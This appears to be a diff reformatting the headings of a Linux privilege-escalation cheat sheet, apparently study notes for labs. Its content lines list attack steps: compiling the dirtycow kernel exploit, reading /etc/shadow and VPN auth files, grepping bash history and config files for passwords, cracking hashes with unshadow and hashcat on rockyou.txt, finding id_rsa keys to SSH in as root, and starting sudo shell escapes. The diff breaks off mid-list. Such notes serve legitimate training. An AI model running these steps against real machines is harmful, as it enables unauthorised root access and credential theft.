@@ -1,6 +1,6 @@
 # Linux privesc
 
-- [ ] ## Privilege Escalation - Kernel Exploits
+### Privilege Escalation - Kernel Exploits
 - Download `linux-exploit-suggester.sh` script: `/linux-exploit-suggester/linux-exploit-suggester.sh`
 - Compile and run `dirtycow` exploit:
 ```bash
@@ -10,16 +10,16 @@ gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
 - Change password: `passwd`
 - Check user privileges: `id`
 
-## Privilege Escalation - Stored Passwords (Config Files)**
+### Privilege Escalation - Stored Passwords (Config Files)**
 - View VPN configuration: `cat /home/user/myvpn.ovpn`
 - Note the "auth-user-pass" directive value in the config.
 - View OpenVPN auth file: `cat /etc/openvpn/auth.txt`
 - Search for passwords in Irssi config: `cat /home/user/.irssi/config | grep -i passw`
 
-- [ ] **Privilege Escalation - Stored Passwords (History)**
+### Privilege Escalation - Stored Passwords (History)
 - Search for passwords in bash history: `cat ~/.bash_history | grep -i passw`
 
-- [ ] **Privilege Escalation - Weak File Permissions**
+### Privilege Escalation - Weak File Permissions
 - List shadow file permissions: `ls -la /etc/shadow`
 - View `/etc/passwd` file: `cat /etc/passwd`
 - View `/etc/shadow` file: `cat /etc/shadow`
@@ -32,7 +32,7 @@ unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt
 hashcat -m 1800 unshadowed.txt rockyou.txt -O
 ```
 
-- [ ] **Privilege Escalation - SSH Keys**
+### Privilege Escalation - SSH Keys
 - Search for authorized_keys and id_rsa files:
 ```bash
 find / -name authorized_keys 2> /dev/null
@@ -41,7 +41,7 @@ find / -name id_rsa 2> /dev/null
 - Set appropriate permissions on id_rsa: `chmod 600 id_rsa`
 - Connect using SSH key: `ssh -i id_rsa root@<ip>`
 
-- [ ] **Privilege Escalation - Sudo (Shell Escaping)**
+### Privilege Escalation - Sudo (Shell Escaping)
 - List sudo permissions: `sudo -l`
 - Perform one of the shell escaping techniques:
 - Execute nano with a shell:
